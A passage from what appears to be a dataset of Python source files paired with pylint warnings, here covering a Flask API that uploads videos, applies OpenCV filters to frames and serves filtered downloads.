24   class DevelopmentConfig(Config):
25   
26       """"""
27       """"""
28       DEBUG = True
29   
30   config = {
31           'development': DevelopmentConfig,
32           'default': DevelopmentConfig
33   }
","5 - refactor: too-few-public-methods
24 - refactor: too-few-public-methods
"
"1   from werkzeug.utils import secure_filename
2   from functools import partial
3   import subprocess as sp
4   import time
5   
6   import skvideo.io
7   import numpy as np
8   import threading
9   import ffmpeg
10   import shlex
11   import cv2
12   import re
13   
14   from PIL import Image
15   
16   from werkzeug.datastructures import FileStorage as FStorage
17   from .. import VIDEO_EXTENSION, VIDEO_WIDTH, VIDEO_HEIGHT, \
18                   VIDEO_UPLOAD_PATH, FRAMES_UPLOAD_PATH, IMG_EXTENSION
19   
20   from . import utils
21   from . errors import IncorrectVideoFormat, InvalidFilterParams, InvalidAPIUsage
22   from . decorators import exception_handler
23   
24   FRAME_SIZE = VIDEO_WIDTH * VIDEO_HEIGHT * 3
25   FRAME_WH = (VIDEO_WIDTH, VIDEO_HEIGHT)
26   FFMPEG_COMMAND = 'ffmpeg -i pipe: -f rawvideo -pix_fmt bgr24 -an -sn pipe: -loglevel quiet'
27   
28   ID_LEN = 32
29   
30   
31   
32   class Frame:
33   
34       def __init__(self, id=None):
35           self.id = id
36   
37       @exception_handler(ex=IncorrectVideoFormat, type=2)
38       def from_bytes(self, in_bytes: bytes) -> np.ndarray:
39           """"""
40           """"""
41           frame_arr = np.frombuffer(in_bytes, np.uint8)
42           f_arr = frame_arr.reshape([VIDEO_HEIGHT, VIDEO_WIDTH, 3])
43           return utils.bgr_to_rgb(f_arr)
44   
45       def f_save(self, frame: np.ndarray, frame_id: str) -> None:
46           upload_path = utils.create_frame_path(frame_id)
47           if utils.is_rgb(frame):
48               Image.fromarray(frame).save(upload_path)
49               return
50           utils.img_from_greyscale(frame).save(upload_path)
51           return
52   
53       def get_by_idx(self, frame_idx):
54           vid = utils.create_vid_path(self.id)
55           cap = cv2.VideoCapture(vid)
56           cap.set(1, frame_idx)
57           _, frame = cap.read()
58           return frame
59   
60   
61   
62   class VideoUploader(Frame):
63   
64       def __init__(self):
65           id = utils.id_generator(ID_LEN)
66           super().__init__(id)
67           self.frame_count = 0
68   
69       def upload_from_bytestream(self, byte_stream: FStorage):
70          video_f_path = utils.create_vid_path(self.id)
71          sk_writer = utils.create_sk_video_writer(video_f_path)
72   
73          sh_command = shlex.split(FFMPEG_COMMAND)
74          process = sp.Popen(sh_command, stdin=sp.PIPE, stdout=sp.PIPE, bufsize=10**8)
75          thread = threading.Thread(target=self._writer, args=(process, byte_stream, ))
76          thread.start()
77   
78          while True:
79              in_bytes = process.stdout.read(FRAME_SIZE)
80              if not in_bytes: break
81              frame = self.from_bytes(in_bytes)
82              self.frame_count += 1
83              if self.frame_count == 1: self.f_save(frame, self.id)
84              sk_writer.writeFrame(frame)
85          thread.join()
86          sk_writer.close()
87   
88       def _writer(self, process, byte_stream):
89           for chunk in iter(partial(byte_stream.read, 1024), b''):
90               process.stdin.write(chunk)
91           try:
92               process.stdin.close()
93           except (BrokenPipeError):
94               pass
95   
96   
97   
98   class Filter:
99   
100       def __init__(self, img=None):
101           self.img = img
102   
103       def applyCanny(self, params):
104           if 'thresh1' in params and 'thresh2' in params:
105               gs_img = self.applyGreyScale(params)
106               return cv2.Canny(gs_img,
107                                int(params['thresh1']),
108                                int(params['thresh2']))
109           raise InvalidFilterParams(3, 'canny')
110   
111       def applyGauss(self, params):
112           if 'ksize_x' and 'ksize_y' in params and \
113               params['ksize_x'] % 2 != 0 and \
114               params['ksize_y'] % 2 != 0:
115               g_img = self.img.copy()
116               if np.ndim(g_img) == 3: g_img = utils.bgr_to_rgb(g_img)
117               return cv2.GaussianBlur(g_img,
118                                      (int(params[""ksize_x""]), int(params[""ksize_y""])), 0)
119           raise InvalidFilterParams(3, 'gauss')
120   
121       def applyGreyScale(self, _):
122           c_img = self.img.copy()
123           return cv2.cvtColor(c_img, cv2.COLOR_RGB2GRAY)
124   
125       def applyLaplacian(self, params):
126           gs_img = self.applyGreyScale(params)
127           return cv2.Laplacian(gs_img, cv2.CV_8U)
128   
129       def run_func(self, params):
130           if params[""type""] in self.filter_map:
131               func = self.filter_map[params[""type""]].__get__(self, type(self))
132               return func(params)
133           raise InvalidFilterParams(2)
134   
135       def _default(self, _):
136           return utils.bgr_to_rgb(self.img)
137   
138       filter_map = {'canny': applyCanny,
139                     'gauss': applyGauss,
140                     'greyscale': applyGreyScale,
141                     'laplacian': applyLaplacian,
142                     '': _default}
143   
144   
145   
146   class VideoDownloader(Frame, Filter):
147   
148       def __init__(self, fps, vid_range=None):
149           Frame.__init__(self)
150           Filter.__init__(self)
151           self.fps = fps
152           self.vid_range = vid_range
153           self.curr_f_frame = None
154           if vid_range:
155               self.range_min = vid_range[0]
156               self.range_max = vid_range[1]
157   
158       def download(self, s_id, tot_video_frames, params):
159               f_vid_name = f'{s_id}_{params[""type""]}'
160               video_f_path = utils.create_vid_path(f_vid_name)
161               local_vid = cv2.VideoCapture(utils.create_vid_path(s_id))
162               vid_writer = utils.create_sk_video_writer(video_f_path, self.fps)
163   
164               for i in range(tot_video_frames-1):
165                   utils.set_cache_f_count(s_id, 'd', i)
166                   _, curr_frame = local_vid.read()
167                   if curr_frame is None: break
168                   self.img = curr_frame
169                   f_frame = self._filter_apply(i, params)
170                   vid_writer.writeFrame(f_frame)
171               vid_writer.close()
172               return f_vid_name
173   
174       def _filter_apply(self, i, params):
175           """"""
176               we simply check if a range is given,
177               then if we get a gs-img from the filter we add three dimensions
178           """"""
179           if self.vid_range:
180               if(i >= self.vid_range[0] and
181                  i <= self.vid_range[1]):
182                   f_frame = self.run_func(params)
183                   if not utils.is_rgb(f_frame):
184                       return np.dstack(3*[f_frame])
185                   return f_frame
186               else:
187                   return self.run_func({""type"":""""})
188           else:
189               return self.run_func(params)
","70 - warning: bad-indentation
71 - warning: bad-indentation
73 - warning: bad-indentation
74 - warning: bad-indentation
75 - warning: bad-indentation
76 - warning: bad-indentation
78 - warning: bad-indentation
79 - warning: bad-indentation
80 - warning: bad-indentation
81 - warning: bad-indentation
82 - warning: bad-indentation
83 - warning: bad-indentation
84 - warning: bad-indentation
85 - warning: bad-indentation
86 - warning: bad-indentation
159 - warning: bad-indentation
160 - warning: bad-indentation
161 - warning: bad-indentation
162 - warning: bad-indentation
164 - warning: bad-indentation
165 - warning: bad-indentation
166 - warning: bad-indentation
167 - warning: bad-indentation
168 - warning: bad-indentation
169 - warning: bad-indentation
170 - warning: bad-indentation
171 - warning: bad-indentation
172 - warning: bad-indentation
17 - error: relative-beyond-top-level
20 - error: no-name-in-module
21 - error: relative-beyond-top-level
22 - error: relative-beyond-top-level
34 - warning: redefined-builtin
65 - warning: redefined-builtin
74 - refactor: consider-using-with
112 - refactor: simplifiable-condition
180 - refactor: no-else-return
180 - refactor: chained-comparison
1 - warning: unused-import
4 - warning: unused-import
6 - warning: unused-import
9 - warning: unused-import
12 - warning: unused-import
17 - warning: unused-import
17 - warning: unused-import
17 - warning: unused-import
17 - warning: unused-import
21 - warning: unused-import
"
"1   from flask import jsonify, request, send_from_directory
2   from . decorators import parameter_check
3   from . import api
4   from ..import HELP_MSG_PATH
5   import json
6   
7   AV_EP = [""upload"", ""preview"", ""download"", ""stats"", ""filters""]
8   AV_FILTERS = [""canny"", ""greyscale"", ""laplacian"", ""gauss""]
9   
10   @api.route('/help/', methods=['GET'])
11   @api.route('/help/<endpts>/', methods=['GET'])
12   @api.route('/help/filters/<filter_type>/', methods=['GET'])
13   @parameter_check(req_c_type='application/json')
14   def help(endpts=None, filter_type=None):
15       if endpts and endpts in AV_EP:
16           return jsonify(load_json_from_val(endpts)), 200
17       elif filter_type and filter_type in AV_FILTERS:
18           return jsonify(load_json_from_val(filter_type)), 200
19       else:
20           return jsonify(load_json_from_val('help')), 200
21   
22   
23   def load_json_from_val(val):
24       f = open(HELP_MSG_PATH+f'/{val}.json')
25       return json.load(f)
","14 - warning: redefined-builtin
2 - error: relative-beyond-top-level
3 - error: no-name-in-module
4 - error: relative-beyond-top-level
15 - refactor: no-else-return
24 - warning: unspecified-encoding
24 - refactor: consider-using-with
1 - warning: unused-import
1 - warning: unused-import
"
"1   import os
2   from flask import Flask, request, redirect, \
3                     url_for, session, jsonify, send_from_directory, make_response, send_file
4   
5   from . import api
6   from . import utils
7   from .. import VIDEO_UPLOAD_PATH, FRAMES_UPLOAD_PATH, IMG_EXTENSION, VIDEO_EXTENSION, CACHE
8   
9   from . VideoProcessing import Frame, VideoUploader, VideoDownloader, Filter
10   from . decorators import parameter_check, url_arg_check, metadata_check
11   from . errors import InvalidAPIUsage
12   
13   
14   
15   @api.route('/upload/', methods=['POST'])
16   @parameter_check(does_return=False, req_c_type='multipart/form-data')
17   @metadata_check(does_return=False, req_type='video/mp4')
18   def upload_video():
19       """"""
20           uploads the video
21       """"""
22   
23       byteStream = request.files['file']
24       vu = VideoUploader()
25       vu.upload_from_bytestream(byteStream)
26   
27       session['s_id'] = vu.id
28       f_c = utils.framecount_from_vid_id(vu.id)
29       session['video_frame_count'] = f_c
30       session['is_uploaded'] = True
31   
32       return jsonify({'status' : '201',
33                       'message' : 'video uploaded!'}), 201
34   
35   
36   
37   @api.route('/preview/', defaults={'frame_idx':1}, methods=['GET'])
38   @api.route('/preview/<frame_idx>/', methods=['GET', 'POST'])
39   @parameter_check(does_return=False, req_c_type='application/json')
40   @url_arg_check(does_return=True, req_type=int, arg='frame_idx', session=session)
41   def preview_thumbnail(frame_idx):
42       """"""
43           Preview a frame by index, given filter parameters
44       """"""
45       if session.get('is_uploaded'):
46           data = request.get_json()
47           filter_params = data['filter_params']
48           session['filter_params'] = filter_params
49           frame = Frame(session['s_id'])
50           frame_i = frame.get_by_idx(frame_idx)
51           filter_frame = Filter(frame_i).run_func(filter_params)
52           frame.f_save(filter_frame, session['s_id'])
53   
54           return send_from_directory(directory=f'{FRAMES_UPLOAD_PATH}',
55                            path=f'{session[""s_id""]}{IMG_EXTENSION}',
56                            as_attachment=True), 200
57   
58       raise InvalidAPIUsage('Invalid usage: please upload a video first')
59   
60   
61   
62   @api.route('/download/', methods=['POST'])
63   @parameter_check(does_return=True, req_c_type='application/json', session=session)
64   def download_video(vid_range):
65       """"""
66           Download a video given filter parameters
67       """"""
68   
69       if session.get('is_uploaded'):
70           data = request.get_json()
71           fps = data['fps']
72           filter_params = data['filter_params']
73           frame_count = session['video_frame_count']
74           vd = VideoDownloader(fps, vid_range)
75           filter_vid = vd.download(session['s_id'], frame_count, filter_params)
76   
77           session['is_downloaded'] = True
78           return send_from_directory(directory=f'{VIDEO_UPLOAD_PATH}',
79                                path=f'{filter_vid}{VIDEO_EXTENSION}',
80                                as_attachment=True), 200
81   
82       raise InvalidAPIUsage('Invalid usage: please upload a video first')
83   
84   
85   @api.route('/status/', methods=['GET'])
86   @parameter_check(req_c_type='application/json')
87   def status():
88       """"""
89           The progress of the user, uploaded, download / frames
90       """"""
91   
92       resp = {}
93       try:
94           if session['is_uploaded']:
95               resp[""upload""] = ""done""
96           if CACHE.get(f""{session['s_id']}_d""):
97               d_status = CACHE.get(f""{session['s_id']}_d"")
98               resp[""downloaded_frames""] = f'{d_status}/{session[""video_frame_count""]}'
99           if session[""is_downloaded""]:
100               resp[""is_downloaded""] = True
101       except KeyError:
102           pass
103       return jsonify({""status"" : resp}), 200
","5 - error: no-name-in-module
6 - error: no-name-in-module
7 - error: relative-beyond-top-level
9 - error: relative-beyond-top-level
10 - error: relative-beyond-top-level
11 - error: relative-beyond-top-level
1 - warning: unused-import
2 - warning: unused-import
2 - warning: unused-import
2 - warning: unused-import
2 - warning: unused-import
2 - warning: unused-import
"
"1   from flask import redirect, url_for, jsonify
2   from . import main
3   
4   @main.app_errorhandler(404)
5   def page_not_found(e):
6       return jsonify(error=str(e)), 404
7   
8   @main.app_errorhandler(405)
9   def method_not_allowed(e):
10       return jsonify(error=str(e)), 405
11   
12   
","2 - error: no-name-in-module
1 - warning: unused-import
1 - warning: unused-import
"
